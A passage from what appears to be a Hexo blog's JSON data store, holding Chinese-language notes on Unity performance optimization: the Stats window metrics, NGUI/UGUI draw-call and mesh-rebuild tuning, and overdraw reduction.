casters：表示场景中有多少个可以投射阴影的物体，一般这些物体都作为场景中的光源。\n* visible skinned  meshed：渲染皮肤网格的数量。\n* Animations:正在播放动画的数量。\n\n```\n参考\nhttps://docs.unity3d.com/Manual/OptimizingGraphicsPerformance.html        \nhttps://docs.unity3d.com/Manual/ProfilerRendering.html      \nhttps://docs.unity3d.com/Manual/RenderingStatistics.html\n```","slug":"Unity/Optimize/Unity工具","published":1,"updated":"2020-10-05T03:30:38.223Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d08003g2gk7ebm5d976","content":"<h1 id=\"ARM-Mobile-Studio\"><a href=\"#ARM-Mobile-Studio\" class=\"headerlink\" title=\"ARM Mobile Studio\"></a>ARM Mobile Studio</h1><h1 id=\"XCode\"><a href=\"#XCode\" class=\"headerlink\" title=\"XCode\"></a>XCode</h1><h1 id=\"AndroidStudio\"><a href=\"#AndroidStudio\" class=\"headerlink\" title=\"AndroidStudio\"></a>AndroidStudio</h1><h1 id=\"RenderDoc\"><a href=\"#RenderDoc\" class=\"headerlink\" title=\"RenderDoc\"></a>RenderDoc</h1><h1 id=\"UWA\"><a href=\"#UWA\" class=\"headerlink\" title=\"UWA\"></a>UWA</h1><h1 id=\"UPR\"><a href=\"#UPR\" class=\"headerlink\" title=\"UPR\"></a>UPR</h1><h1 id=\"Profile\"><a href=\"#Profile\" class=\"headerlink\" title=\"Profile\"></a>Profile</h1><h1 id=\"Frame-Debug\"><a href=\"#Frame-Debug\" class=\"headerlink\" title=\"Frame Debug\"></a>Frame Debug</h1><h1 id=\"Physics-Debug\"><a href=\"#Physics-Debug\" class=\"headerlink\" title=\"Physics Debug\"></a>Physics Debug</h1><h1 id=\"渲染统计窗口\"><a href=\"#渲染统计窗口\" class=\"headerlink\" title=\"渲染统计窗口\"></a>渲染统计窗口</h1><p>游戏视野（Game View）右上角有一个Stats按钮。这个按钮是按下状态时，会显示一个半透明窗口，它显示对于优化性能很有用的实时渲染统计数据。根据目标平台不同，精确的统计数据也不同。</p>\n<ul>\n<li>Time per frame and FPS:每帧时间和FPS.处理和渲染一帧消耗的时间（它决定FPS）。注意这个时间仅包含每帧的逻辑更新和游戏视图渲染，不包含编辑器绘制屏幕适度、检视器和其它编辑器中才有的处理。<br>详情:表示引擎处理和渲染一个游戏帧所花费的时间,该数字主要受到场景中渲染物体数量和 GPU性能的影响，FPS数值越高，游戏场景的动画显示会更加平滑和流畅。一般来说，超过30FPS的画面人眼不会感觉到卡，由于视觉残留的特性，光在视网膜上停止总用后人眼还会保持1/24秒左右的时间，因此游戏画面每秒帧数至少要保证在30以上。另外，Unity中的FPS数值仅包括此游戏Scene里更新和渲染的帧，编辑器中绘制的Scene和其它监视窗口的进程不包括在内。</li>\n</ul>\n<ul>\n<li><p>CPU:获取到当前占用CPU进行计算的时间绝对值，或时间点，如果Unity主进程处于挂断或休眠状态时，CPU time将会保持不变。</p>\n</li>\n<li><p>Render thread:GPU渲染线程处理图像所花费的时间，具体数值由GPU性能来决定.</p>\n</li>\n<li><p>Batches:绘制调用,“批处理”的引擎试图将多个渲染对象合并到一个内存块中, 以减少CPU开销。即Batched Draw Calls,是Unity内置的Draw Call Batching技术。<br>首先解释下什么叫做“Draw call”，CPU每次通知GPU发出一个glDrawElements（OpenGl中的图元渲染函数)或者 DrawIndexedPrimitive（DirectX中的顶点绘制方法）的过程称为一次Draw call,一般来说，引擎每对一个物体进行一次DrawCall，就会产生一个Batch,这个Batch里包含着该物体所有的网格和顶点数据，当渲染另一个相同的物体时，引擎会直接调用Batch里的信息，将相关顶点数据直接送到GPU,从而让渲染过程更加高效，即Batching技术是将所有材质相近的物体进行合并渲染。主要为 GPU调用数据 节省资源与时间.<br>对于含有多个不同Shader和Material的物体，渲染的过程比较耗时，因为会产生多个Batches。每次对物体的材质或者贴图进行修改，都会影响Batches里数据集的构成。因此，如果场景中有大量材质不同的物体，会很明显的影响到GPU的渲染效率。这里说几点关于Batches优化相关的方案:</p>\n<blockquote>\n<p>虽然Unity引擎自带Draw Call Batching技术，我们也可以通过手动的方式合并材质接近的物体；<br>尽量不要修改Batches里物体的Scale，因为这样会生成新的Batch。<br>为了提升GPU的渲染效率，应当尽可能的在一个物体上使用较少的材质，减少Batches过多的开销；<br>对于场景中不会运动的物体，考虑设置Static属性,Static声明的物体会自动进行内部批处理优化。    </p>\n</blockquote>\n</li>\n<li><p>Verts：摄像机视野(field of view)内渲染的顶点总数。  </p>\n</li>\n<li><p>Tris:   摄像机视野(field of view)内渲染的的三角面总数量。      </p>\n</li>\n</ul>\n<blockquote>\n<ol>\n<li>Camera的渲染性能受到Draw calls的影响。之前说过，对一个物体进行渲染，会生成相应的Draw call，处理一个Draw Call的时间是由它上边的Tris和Verts数目决定。尽可能得合并物体，会很大程度的提高性能。举个很简单例子，比如场景一种有1000个不同的物体，每个物体都有10个Tris；场景二中有10个不同的物体，每个物体有1000个Tris。在渲染处理中，场景一中会产生1000个Draw Calls，它的渲染时间明显比场景二慢。     </li>\n<li>Unity stats 视图中的 Tris 和 Verts 并不仅仅是视锥中的梯形内的 Tris 和 Verts，而是Camera中 field of view所有取值下的tris和verts，换句话说，哪怕你在当前game视图中看不到这个 cube，如果当你把 field of view调大到 179 过程中都看不到这个cube，stats面板才不会统计，GPU才不会渲染，否则都会渲染，而且unity不会把模型拆分，这个模型哪怕只有1个顶点需要渲染，unity也会把整个模型都渲出来。（参考自Mess的《Unity Camera组件部分参数详解》）</li>\n</ol>\n</blockquote>\n<ul>\n<li><p>Screen:获当前Game屏幕的分辨率大小，后边的2.1MB表示总的内存使用数值。</p>\n</li>\n<li><p>SetPass calls:之前有讲到Batches,比如说场景中有100个gameobject,它们拥有完全一样的Material,那么这100个物体很可能会被Unity里的Batching机制结合成一个Batch。所以用“Batches”来描述Unity的渲染性能是不太合适的，它只能反映出场景中需要批处理物体的数量。那么可否用“Draw calls”来描述呢？答案同样是不适合。每一个“Draw calls”是CPU发送个GPU的一个渲染请求，请求中包括渲染对象所有的顶点参数、三角面、索引值、图元个数等，这个请求并不会占用过多的消耗，真正消耗渲染资源的是在GPU得到请求指令后，把指令发送给对应物体的Shader,让Shader读取指令并通知相应的渲染通道（Pass）进行渲染操作。<br>场景上有1个GameObject，希望能显示很酷炫的效果，它的Material上带有许多特定的Shader。为了实现相应的效果，Shader里或许会包含很多的Pass,每当GPU即将去运行一个Pass之前，就会产生一个“SetPass call”，因此在描述渲染性能开销上，“SetPass calls”更加有说服力。    </p>\n</li>\n<li><p>Shadow casters：表示场景中有多少个可以投射阴影的物体，一般这些物体都作为场景中的光源。</p>\n</li>\n<li><p>visible skinned  meshed：渲染皮肤网格的数量。</p>\n</li>\n<li><p>Animations:正在播放动画的数量。</p>\n</li>\n</ul>\n<pre><code>参考\nhttps://docs.unity3d.com/Manual/OptimizingGraphicsPerformance.html        \nhttps://docs.unity3d.com/Manual/ProfilerRendering.html      \nhttps://docs.unity3d.com/Manual/RenderingStatistics.html</code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"ARM-Mobile-Studio\"><a href=\"#ARM-Mobile-Studio\" class=\"headerlink\" title=\"ARM Mobile Studio\"></a>ARM Mobile Studio</h1><h1 id=\"XCode\"><a href=\"#XCode\" class=\"headerlink\" title=\"XCode\"></a>XCode</h1><h1 id=\"AndroidStudio\"><a href=\"#AndroidStudio\" class=\"headerlink\" title=\"AndroidStudio\"></a>AndroidStudio</h1><h1 id=\"RenderDoc\"><a href=\"#RenderDoc\" class=\"headerlink\" title=\"RenderDoc\"></a>RenderDoc</h1><h1 id=\"UWA\"><a href=\"#UWA\" class=\"headerlink\" title=\"UWA\"></a>UWA</h1><h1 id=\"UPR\"><a href=\"#UPR\" class=\"headerlink\" title=\"UPR\"></a>UPR</h1><h1 id=\"Profile\"><a href=\"#Profile\" class=\"headerlink\" title=\"Profile\"></a>Profile</h1><h1 id=\"Frame-Debug\"><a href=\"#Frame-Debug\" class=\"headerlink\" title=\"Frame Debug\"></a>Frame Debug</h1><h1 id=\"Physics-Debug\"><a href=\"#Physics-Debug\" class=\"headerlink\" title=\"Physics Debug\"></a>Physics Debug</h1><h1 id=\"渲染统计窗口\"><a href=\"#渲染统计窗口\" class=\"headerlink\" title=\"渲染统计窗口\"></a>渲染统计窗口</h1><p>游戏视野（Game View）右上角有一个Stats按钮。这个按钮是按下状态时，会显示一个半透明窗口，它显示对于优化性能很有用的实时渲染统计数据。根据目标平台不同，精确的统计数据也不同。</p>\n<ul>\n<li>Time per frame and FPS:每帧时间和FPS.处理和渲染一帧消耗的时间（它决定FPS）。注意这个时间仅包含每帧的逻辑更新和游戏视图渲染，不包含编辑器绘制屏幕适度、检视器和其它编辑器中才有的处理。<br>详情:表示引擎处理和渲染一个游戏帧所花费的时间,该数字主要受到场景中渲染物体数量和 GPU性能的影响，FPS数值越高，游戏场景的动画显示会更加平滑和流畅。一般来说，超过30FPS的画面人眼不会感觉到卡，由于视觉残留的特性，光在视网膜上停止总用后人眼还会保持1/24秒左右的时间，因此游戏画面每秒帧数至少要保证在30以上。另外，Unity中的FPS数值仅包括此游戏Scene里更新和渲染的帧，编辑器中绘制的Scene和其它监视窗口的进程不包括在内。</li>\n</ul>\n<ul>\n<li><p>CPU:获取到当前占用CPU进行计算的时间绝对值，或时间点，如果Unity主进程处于挂断或休眠状态时，CPU time将会保持不变。</p>\n</li>\n<li><p>Render thread:GPU渲染线程处理图像所花费的时间，具体数值由GPU性能来决定.</p>\n</li>\n<li><p>Batches:绘制调用,“批处理”的引擎试图将多个渲染对象合并到一个内存块中, 以减少CPU开销。即Batched Draw Calls,是Unity内置的Draw Call Batching技术。<br>首先解释下什么叫做“Draw call”，CPU每次通知GPU发出一个glDrawElements（OpenGl中的图元渲染函数)或者 DrawIndexedPrimitive（DirectX中的顶点绘制方法）的过程称为一次Draw call,一般来说，引擎每对一个物体进行一次DrawCall，就会产生一个Batch,这个Batch里包含着该物体所有的网格和顶点数据，当渲染另一个相同的物体时，引擎会直接调用Batch里的信息，将相关顶点数据直接送到GPU,从而让渲染过程更加高效，即Batching技术是将所有材质相近的物体进行合并渲染。主要为 GPU调用数据 节省资源与时间.<br>对于含有多个不同Shader和Material的物体，渲染的过程比较耗时，因为会产生多个Batches。每次对物体的材质或者贴图进行修改，都会影响Batches里数据集的构成。因此，如果场景中有大量材质不同的物体，会很明显的影响到GPU的渲染效率。这里说几点关于Batches优化相关的方案:</p>\n<blockquote>\n<p>虽然Unity引擎自带Draw Call Batching技术，我们也可以通过手动的方式合并材质接近的物体；<br>尽量不要修改Batches里物体的Scale，因为这样会生成新的Batch。<br>为了提升GPU的渲染效率，应当尽可能的在一个物体上使用较少的材质，减少Batches过多的开销；<br>对于场景中不会运动的物体，考虑设置Static属性,Static声明的物体会自动进行内部批处理优化。    </p>\n</blockquote>\n</li>\n<li><p>Verts：摄像机视野(field of view)内渲染的顶点总数。  </p>\n</li>\n<li><p>Tris:   摄像机视野(field of view)内渲染的的三角面总数量。      </p>\n</li>\n</ul>\n<blockquote>\n<ol>\n<li>Camera的渲染性能受到Draw calls的影响。之前说过，对一个物体进行渲染，会生成相应的Draw call，处理一个Draw Call的时间是由它上边的Tris和Verts数目决定。尽可能得合并物体，会很大程度的提高性能。举个很简单例子，比如场景一种有1000个不同的物体，每个物体都有10个Tris；场景二中有10个不同的物体，每个物体有1000个Tris。在渲染处理中，场景一中会产生1000个Draw Calls，它的渲染时间明显比场景二慢。     </li>\n<li>Unity stats 视图中的 Tris 和 Verts 并不仅仅是视锥中的梯形内的 Tris 和 Verts，而是Camera中 field of view所有取值下的tris和verts，换句话说，哪怕你在当前game视图中看不到这个 cube，如果当你把 field of view调大到 179 过程中都看不到这个cube，stats面板才不会统计，GPU才不会渲染，否则都会渲染，而且unity不会把模型拆分，这个模型哪怕只有1个顶点需要渲染，unity也会把整个模型都渲出来。（参考自Mess的《Unity Camera组件部分参数详解》）</li>\n</ol>\n</blockquote>\n<ul>\n<li><p>Screen:获当前Game屏幕的分辨率大小，后边的2.1MB表示总的内存使用数值。</p>\n</li>\n<li><p>SetPass calls:之前有讲到Batches,比如说场景中有100个gameobject,它们拥有完全一样的Material,那么这100个物体很可能会被Unity里的Batching机制结合成一个Batch。所以用“Batches”来描述Unity的渲染性能是不太合适的，它只能反映出场景中需要批处理物体的数量。那么可否用“Draw calls”来描述呢？答案同样是不适合。每一个“Draw calls”是CPU发送个GPU的一个渲染请求，请求中包括渲染对象所有的顶点参数、三角面、索引值、图元个数等，这个请求并不会占用过多的消耗，真正消耗渲染资源的是在GPU得到请求指令后，把指令发送给对应物体的Shader,让Shader读取指令并通知相应的渲染通道（Pass）进行渲染操作。<br>场景上有1个GameObject，希望能显示很酷炫的效果，它的Material上带有许多特定的Shader。为了实现相应的效果，Shader里或许会包含很多的Pass,每当GPU即将去运行一个Pass之前，就会产生一个“SetPass call”，因此在描述渲染性能开销上，“SetPass calls”更加有说服力。    </p>\n</li>\n<li><p>Shadow casters：表示场景中有多少个可以投射阴影的物体，一般这些物体都作为场景中的光源。</p>\n</li>\n<li><p>visible skinned  meshed：渲染皮肤网格的数量。</p>\n</li>\n<li><p>Animations:正在播放动画的数量。</p>\n</li>\n</ul>\n<pre><code>参考\nhttps://docs.unity3d.com/Manual/OptimizingGraphicsPerformance.html        \nhttps://docs.unity3d.com/Manual/ProfilerRendering.html      \nhttps://docs.unity3d.com/Manual/RenderingStatistics.html</code></pre>"},{"title":"Unity NGUI/UGUI优化","date":"2020-05-08T03:41:32.000Z","top":8,"_content":"\n****\n\n# UI优化\n* 1,降低界面的渲染开销.2,降低界面的更新开销(网格合并).3,高效处理大量 HUD 元素.\n* NGUI 与 UGUI 的不同点在于:元素更新方式(字/图片更新时的不同), DrawCall合并规则,网格更新机制\n* 直播视频 https://blog.uwa4d.com/archives/video_UI.html\n* https://blog.uwa4d.com/archives/USparkle_NGUI.html\n\n\n# NGUI优化\n![NGUI代码文件](NGUIFile.png)\n![NGUI内核](NGUIInternal.png)\n\n* 参考文档:         \nhttps://blog.uwa4d.com/archives/USparkle_NGUI.html,       \nhttps://zhuanlan.zhihu.com/p/102544809\n* 元素更新方式:一个 UI 展示在界面上面,是将图片以及文字转换成为顶点,UV,颜色,法线,切线,三角形顶点索引等合成 Mesh,然后在 GPU 上面呈现响应的人体识别的像素.\n* 使用 BetterList进行优化\n* 对于 NGUI 使用大量的 SetActive(false),适量的:Color.a=0,移除,Timer+二级缓存\n* 渲染顺序:Draw Call合并规则,以 UIPanel 为单位,将 UIPanel 下面的元素 以 Depth 大小为排序规则,如果是相同的图集,就合并成一个 Draw Call,进行合并.      \n检测 Draw Call -->在每个 UIPanel 上面可以调用出 DrawCall Tool           \n* 网格更新 UIPanel.LateUpdate 两种更新方式:UIPanel.FillDrawCall 更新单个 DrawCall ,      \nUIPanel.FillAllDrawCalls 更新所有 DrawCall,如果这种情况经常发生,CPU会有峰值.\n* 一个 DrawCall 对应一个 Mesh,网格重建时是根据不同的 Mesh,例如字体与图片的 mesh 就不同,就会分开重建\n* 先拆分 UIPanel,控制 FillAllDrawCalls\n* 降低界面的渲染开销:\n>* profiling 查看开销\n>* DrawCall 多少\n>* Mesh.xxxVBO 网格更新创建,网格经常变动,就会不停的刷新 VBO,然后提交到 GPU 进行渲染\n>* GPU 的 过度绘制 Overdraw\n>* NGUI 产生的 Mesh 都是通过 MeshRenderer 画出来的\n>* NGUI 中的 UITexture,单独占用一个 DrawCall; Depth 穿插 同一个图集或者字体,设置相近的 Depth;设置了 Scale=0\n>* 动静分离,拆分 UIPanel\n>* 降低更新频率,降低小地图的更新频率,一段时间内,小地图内的元素不更新不移动等.\n>* 避免\"敏感操作\".因为元素隐藏和显示,触发了FillAllDrawCalls,添加/删除元素时,穿插了其他的 UIDrawCall 或者自成一个UIDrawCall.     \n尝试让插入的元素能够合入现有的 UIDrawCall,通过 Scale =0或者 alpha 接近 0 来隐藏.\n>* 优化选项: Static 选项,如果当前这个界面是静态界面,不会发生位移,就可以打开     \n Visible,如果打开,就不需要重新计算控件的包围盒,用在大量计算 mesh 重建上面.例子:在界面上面完全展示出来的,就不需要计算,可以勾选\n\n> * 高效处理大量 HUD (血条),图片尽量使用 Simple/Filled 模式,顶点数,面数尽量降低,尽可能使用相同图集.最好分帧加载 HUD.        \n对于伤害数字(飘字),可以转成图片字,不要修改父节点,使用对象重用池,隔帧更新,控制总量.使用 world space 替换 worldtoscreenpoint 主角单独一个 Canvas/UIPanel,这样当主角行动时,不会触发其他重建.将血条替换为 Shadow\n\n\n****\n\n# UGUI 优化\n* 元素更新方式:使用 Scale=0,Alpha Group =0 \n* 渲染顺序:Draw Call合并规则, 需要仔细测试,图片和图片在同一级,字体和字体在同一级,如果中间缺一级,可以添加一个中间级别来分割从而减低 draw call 等等操作.      \n检测 Draw Call -->使用 Frame Debugger           \n在 UGUI 上面对 Draw Call 做优化,1:检测重叠是由控件的包围盒子去检测是否重叠的,需要注意.2:不规则摆放的图片,需要在一个图集里面.3:动态遮挡.4:3D UI 等,都是有非常高的 Draw Call\n* 网格更新 Canvas.BuildBatch 更新所有的 DrawCall  ,仅限于当前的这个Canvas  \n WaitingForJob      \n PutGeometryJobFence        \n BatchRenderer.Flush \n* 一个 DrawCall 对应一个 Mesh,网格重建时是根据不同的 Canvas,例如字体与图片的 Canvas 相同,就会一起进行重建\n* 拆分 Canvas\n* 降低界面的渲染开销:   \n>* profiling 查看开销\n>* DrawCall 多少\n>* Mesh.xxxVBO 网格更新创建,网格经常变动,就会不停的刷新 VBO,然后提交到 GPU 进行渲染\n>* GPU 的 过度绘制 Overdraw\n>* UGUI 的 Z 值不为 0,与其他的 UI 不同,会被单独合批成为一个 Draw Call,把 UI 移动到屏幕外,不会降低 Draw Call     \n>* UGUI 的 DrawCall 上升的主要原因是 Hierarchy 中的 穿插与重叠,例如:scrollveiw 与图标,红点等等\n>* UGUI Sprite Packer图集,一组纹理具有相同的 tag, 但是打在了不同的图集里面了,是因为 alpha 通道不同,压缩方式不同.会让人以为本来是一个图集,结果会在不同的图集里面\n>* 动静分离\n>* 降低更新频率\n>* 避免\"敏感操作\",不要对 UI 进行相同的 position 赋值,除非position进行肉眼可见的改变,每次赋值底层可能都在进行Mesh重建,如果有就会重建.\n>* 优化选项\n\n> * 高效处理大量 HUD (血条),图片尽量使用 Simple/Filled 模式,顶点数,面数尽量降低,尽可能使用相同图集.最好分帧加载 HUD.        \n对于伤害数字(飘字),可以转成图片字,不要修改父节点,使用对象重用池,隔帧更新,控制总量. 使用 world space 替换 worldtoscreenpoint 主角单独一个 Canvas/UIPanel,这样当主角行动时,不会触发其他重建,使用 textMesh/textpro 第三方库.将血条替换为 Shadow\n> * 子线程合批 mesh\n> * 检查重叠关系,使用线框模式检查\n> * 文字图片分层,最好将所有的文字分在一层(拓扑排序中),放在渲染最顶层\n> * 只接受逻辑,不进行绘制\n> * 将多边形镂空的脚本,只有可显示区域进行绘制 https://blog.uwa4d.com/archives/fillrate.html\n> * 减少事件拦截,不需要事件响应的,不需要勾选 Raycast Target\n> * 动静分离时:自动给动态的组件添加上 cavans \n> * 如果有动画一直修改 Image 上面的 color 属性,就是修改顶点属性上面的修改会导致重建网格(mesh),需要写个脚本创建一个 material 在 lateUpdate 里面修改创建的material的颜色达到动画的目的\n\n# Overdraw优化,降低填充率\nGPU Overdraw局部像素区域压力过大,单像素填充压力过大.\n* 1:在某个背景上有个按钮，要将按钮绘制在背景上，这个就是Overdraw，Overdraw无法避免，只能优化降低\n\n* 2.性能参数        \n总填充数值峰:单帧总填充像素数量最大值       \n填充倍数峰值:单帧最大填充倍数(10.0X就是该帧刷新10遍)        \n单帧填充倍数:该帧总填充数/该帧渲染相机分辨率        \n* 3.优化方案\n控制绘制顺序:PC上资源无限，一般都是从后往前绘制，但在移动上，尽量从前往后绘制.在Unity中，那些Shader中被设置为“Geometry”队列的对象总是从前往后绘制的，而其他固定队列（如“Transparent”“Overla”等）的物体，则都是从后往前绘制的。这意味这，我们可以尽量把物体的队列设置为“Geometry” 。\n尽量减小过度绘制区域:实在需要多层绘制的地方，要尽量减小各部分过度绘制区域，使重合区域小，绘制的像素点也就少一点\n注意性能与效果的取舍:UGUI的许多控件有很好的通用性和展示效果，但是可能会耗更多性能\n过大的不必要绘制尽量代码实现:例如点击屏幕空白区域返回功能，加透明image会增加很多\nUI设计上尽可能简单减少重叠\n\n* 4.针对性优化\n1)文字部分\n主要原因是使用了Outline，Outline实现方式是将Text的四个顶点传过去复制四份，设置四份偏移量实现效果，将偏移量设置很大之后，可以看到一个Text周围有四个相同的Text        \n解决方案:\n1.不使用或者使用Shadow(Shadow通过为图像或者文字的Mesh添加顶点实现阴影效果，Outline继承Shadow，在对象四个角上各添加一个Shadow)\n2.使用Textmesh Pro(Unity5.5)需要制作相应的字体文件，对于动态生成的文字效果不好，固定字体很好\n(https://blog.csdn.net/dark00800/article/details/73011343?utm_source=itdadao&utm_medium=referral)\n3.修改Mesh的UV坐标，提取文字原始UV坐标，扩大文字绘图区域，对文字纹理周围像素点采样，新旧颜色融合\n(http://gad.qq.com/article/detail/29266)\n2)适配IphoneX\n适配的需要加了层背景，不是iPhoneX失活就可以\n\n3)背景人物mesh\n裁剪小一点更好\n\n\n1)Mask组件\nUnity的Mask组件会增加一层Overdraw，还会多增加4个DrawCall\n解决:\n1.使用RectMask2D代替，缺点是只能用于矩形\n2.对于多边形，用MeshMask，红色为UnityMask，蓝色是MeshMask，UnityMask消耗15个DrawCall，Overdraw2次，MeshMask消耗1个DrawCall，1层OverDraw(https://www.cnblogs.com/leoin2012/p/6822859.html)\n\n2)Image的slide属性\n对于slide九宫格图片，可以看情况取消fill center属性，那样中心区域会不渲染，中心区域也就镂空，重合面积也会小\n\n1)重合多的地方尽可能不重合\n\n2)无用的Image\n少量的panel或者单纯的空父物体身上加着image，虽然没有给图片，但是还是会渲染\n\n3)移动的波浪图片过大过多(修改高度，宽度)\n4)特效粒子效果优化(http://www.u3dnotes.com/archives/807)\n粒子效果薄弱的可以使用序列帧动画实现\n\n1)三层大底图，一个纯黑底，还有两层楼梯背景(可以纯黑底图合并到两层)\n2)楼梯前底图可以小一点不和最底下图标重叠\n\n部分小细节：\n1.slide九宫格图片，取消fill center，中心镂空\n2.mask尽量不用，可以用rect mask2D 代替\n3.不用UI/Effect，包括Shadow，Outline，Position As UV1\n4.不用Image的Tiled类型\n5.不用Pixel Perfect\n6.动静分离，动态的在父物体上加个Canvas\n7.尽量active，不要destroy，也不要设置Alpha=0这样还是会渲染\n8.不用BestFit(代价高，Unity会为该元素用到的所有字号生成图元保存在Altlas中，增加额外生成时间，还会使得字体对应的atlas变大)\n9.特效粒子\n\n⑴尽量减少alpha = 0的资源的使用，因为这种资源也会参与绘制，占用一定的GPU。 ⑵制作图集的时候，尽量使小图排布紧凑，尽量图集中大面积留白，理由同上。 ⑶避免无用对象及组件的过度使用\n如果sprite是中心镂空且切图为九宫格时，可以去除fill center，以减少over draw游戏中许多时候会使用一个透明的Image组件来监听点击事件或者屏蔽Image后面的按钮事件，空的Image可以解决这个问题，用起来也很方便，但是空的Image照旧会参与绘制，从而产生overdraw。解决办法是扩展Graphic组件来替换Image组件。 如果是只要点击区域，不要显示内容的。","source":"_posts/Unity/Optimize/Unity_UI优化.md","raw":"---\ntitle: Unity NGUI/UGUI优化\ndate: 2020-05-08 11:41:32\ntop: 8\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---\n\n****\n\n# UI优化\n* 1,降低界面的渲染开销.2,降低界面的更新开销(网格合并).3,高效处理大量 HUD 元素.\n* NGUI 与 UGUI 的不同点在于:元素更新方式(字/图片更新时的不同), DrawCall合并规则,网格更新机制\n* 直播视频 https://blog.uwa4d.com/archives/video_UI.html\n* https://blog.uwa4d.com/archives/USparkle_NGUI.html\n\n\n# NGUI优化\n![NGUI代码文件](NGUIFile.png)\n![NGUI内核](NGUIInternal.png)\n\n* 参考文档:         \nhttps://blog.uwa4d.com/archives/USparkle_NGUI.html,       \nhttps://zhuanlan.zhihu.com/p/102544809\n* 元素更新方式:一个 UI 展示在界面上面,是将图片以及文字转换成为顶点,UV,颜色,法线,切线,三角形顶点索引等合成 Mesh,然后在 GPU 上面呈现响应的人体识别的像素.\n* 使用 BetterList进行优化\n* 对于 NGUI 使用大量的 SetActive(false),适量的:Color.a=0,移除,Timer+二级缓存\n* 渲染顺序:Draw Call合并规则,以 UIPanel 为单位,将 UIPanel 下面的元素 以 Depth 大小为排序规则,如果是相同的图集,就合并成一个 Draw Call,进行合并.      \n检测 Draw Call -->在每个 UIPanel 上面可以调用出 DrawCall Tool           \n* 网格更新 UIPanel.LateUpdate 两种更新方式:UIPanel.FillDrawCall 更新单个 DrawCall ,      \nUIPanel.FillAllDrawCalls 更新所有 DrawCall,如果这种情况经常发生,CPU会有峰值.\n* 一个 DrawCall 对应一个 Mesh,网格重建时是根据不同的 Mesh,例如字体与图片的 mesh 就不同,就会分开重建\n* 先拆分 UIPanel,控制 FillAllDrawCalls\n* 降低界面的渲染开销:\n>* profiling 查看开销\n>* DrawCall 多少\n>* Mesh.xxxVBO 网格更新创建,网格经常变动,就会不停的刷新 VBO,然后提交到 GPU 进行渲染\n>* GPU 的 过度绘制 Overdraw\n>* NGUI 产生的 Mesh 都是通过 MeshRenderer 画出来的\n>* NGUI 中的 UITexture,单独占用一个 DrawCall; Depth 穿插 同一个图集或者字体,设置相近的 Depth;设置了 Scale=0\n>* 动静分离,拆分 UIPanel\n>* 降低更新频率,降低小地图的更新频率,一段时间内,小地图内的元素不更新不移动等.\n>* 避免\"敏感操作\".因为元素隐藏和显示,触发了FillAllDrawCalls,添加/删除元素时,穿插了其他的 UIDrawCall 或者自成一个UIDrawCall.     \n尝试让插入的元素能够合入现有的 UIDrawCall,通过 Scale =0或者 alpha 接近 0 来隐藏.\n>* 优化选项: Static 选项,如果当前这个界面是静态界面,不会发生位移,就可以打开     \n Visible,如果打开,就不需要重新计算控件的包围盒,用在大量计算 mesh 重建上面.例子:在界面上面完全展示出来的,就不需要计算,可以勾选\n\n> * 高效处理大量 HUD (血条),图片尽量使用 Simple/Filled 模式,顶点数,面数尽量降低,尽可能使用相同图集.最好分帧加载 HUD.        \n对于伤害数字(飘字),可以转成图片字,不要修改父节点,使用对象重用池,隔帧更新,控制总量.使用 world space 替换 worldtoscreenpoint 主角单独一个 Canvas/UIPanel,这样当主角行动时,不会触发其他重建.将血条替换为 Shadow\n\n\n****\n\n# UGUI 优化\n* 元素更新方式:使用 Scale=0,Alpha Group =0 \n* 渲染顺序:Draw Call合并规则, 需要仔细测试,图片和图片在同一级,字体和字体在同一级,如果中间缺一级,可以添加一个中间级别来分割从而减低 draw call 等等操作.      \n检测 Draw Call -->使用 Frame Debugger           \n在 UGUI 上面对 Draw Call 做优化,1:检测重叠是由控件的包围盒子去检测是否重叠的,需要注意.2:不规则摆放的图片,需要在一个图集里面.3:动态遮挡.4:3D UI 等,都是有非常高的 Draw Call\n* 网格更新 Canvas.BuildBatch 更新所有的 DrawCall  ,仅限于当前的这个Canvas  \n WaitingForJob      \n PutGeometryJobFence        \n BatchRenderer.Flush \n* 一个 DrawCall 对应一个 Mesh,网格重建时是根据不同的 Canvas,例如字体与图片的 Canvas 相同,就会一起进行重建\n* 拆分 Canvas\n* 降低界面的渲染开销:   \n>* profiling 查看开销\n>* DrawCall 多少\n>* Mesh.xxxVBO 网格更新创建,网格经常变动,就会不停的刷新 VBO,然后提交到 GPU 进行渲染\n>* GPU 的 过度绘制 Overdraw\n>* UGUI 的 Z 值不为 0,与其他的 UI 不同,会被单独合批成为一个 Draw Call,把 UI 移动到屏幕外,不会降低 Draw Call     \n>* UGUI 的 DrawCall 上升的主要原因是 Hierarchy 中的 穿插与重叠,例如:scrollveiw 与图标,红点等等\n>* UGUI Sprite Packer图集,一组纹理具有相同的 tag, 但是打在了不同的图集里面了,是因为 alpha 通道不同,压缩方式不同.会让人以为本来是一个图集,结果会在不同的图集里面\n>* 动静分离\n>* 降低更新频率\n>* 避免\"敏感操作\",不要对 UI 进行相同的 position 赋值,除非position进行肉眼可见的改变,每次赋值底层可能都在进行Mesh重建,如果有就会重建.\n>* 优化选项\n\n> * 高效处理大量 HUD (血条),图片尽量使用 Simple/Filled 模式,顶点数,面数尽量降低,尽可能使用相同图集.最好分帧加载 HUD.        \n对于伤害数字(飘字),可以转成图片字,不要修改父节点,使用对象重用池,隔帧更新,控制总量. 使用 world space 替换 worldtoscreenpoint 主角单独一个 Canvas/UIPanel,这样当主角行动时,不会触发其他重建,使用 textMesh/textpro 第三方库.将血条替换为 Shadow\n> * 子线程合批 mesh\n> * 检查重叠关系,使用线框模式检查\n> * 文字图片分层,最好将所有的文字分在一层(拓扑排序中),放在渲染最顶层\n> * 只接受逻辑,不进行绘制\n> * 将多边形镂空的脚本,只有可显示区域进行绘制 https://blog.uwa4d.com/archives/fillrate.html\n> * 减少事件拦截,不需要事件响应的,不需要勾选 Raycast Target\n> * 动静分离时:自动给动态的组件添加上 cavans \n> * 如果有动画一直修改 Image 上面的 color 属性,就是修改顶点属性上面的修改会导致重建网格(mesh),需要写个脚本创建一个 material 在 lateUpdate 里面修改创建的material的颜色达到动画的目的\n\n# Overdraw优化,降低填充率\nGPU Overdraw局部像素区域压力过大,单像素填充压力过大.\n* 1:在某个背景上有个按钮，要将按钮绘制在背景上，这个就是Overdraw，Overdraw无法避免，只能优化降低\n\n* 2.性能参数        \n总填充数值峰:单帧总填充像素数量最大值       \n填充倍数峰值:单帧最大填充倍数(10.0X就是该帧刷新10遍)        \n单帧填充倍数:该帧总填充数/该帧渲染相机分辨率        \n* 